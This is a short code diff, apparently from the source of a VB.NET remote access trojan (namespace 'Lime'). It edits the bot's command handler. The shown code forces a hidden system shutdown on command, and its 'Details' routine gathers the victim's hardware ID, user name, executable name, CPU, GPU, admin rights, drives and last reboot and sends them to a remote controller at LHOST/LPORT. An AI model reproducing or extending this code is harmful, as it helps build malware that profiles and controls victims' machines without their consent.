@@ -50,7 +50,7 @@ Namespace Lime
                         Shell("shutdown -s -t 00 -f", AppWinStyle.Hide, False, -1)
          '###############################################################################
                     Case "Details"
-                        C.Send("Details" + C.SPL + ID.HWID + C.SPL + ID.UserName + C.SPL + Reflection.Assembly.GetExecutingAssembly.Location + C.SPL + ID.CPU + C.SPL + ID.GPU + C.SPL + ID.AmiAdmin + C.SPL + ID.MachineType + C.SPL + DateAndTime.Now + C.SPL + ID.ListDrivers + C.SPL + ID.LastReboot + C.SPL + Settings.LHOST + " @ " + Settings.LPORT.ToString)
+                        C.Send("Details" + C.SPL + ID.HWID + C.SPL + ID.UserName + C.SPL + ID.BinName + C.SPL + ID.CPU + C.SPL + ID.GPU + C.SPL + ID.AmiAdmin + C.SPL + ID.MachineType + C.SPL + DateAndTime.Now + C.SPL + ID.ListDrivers + C.SPL + ID.LastReboot + C.SPL + Settings.LHOST + " @ " + Settings.LPORT.ToString)
 
                     '###############################################################################
                     '###############################################################################
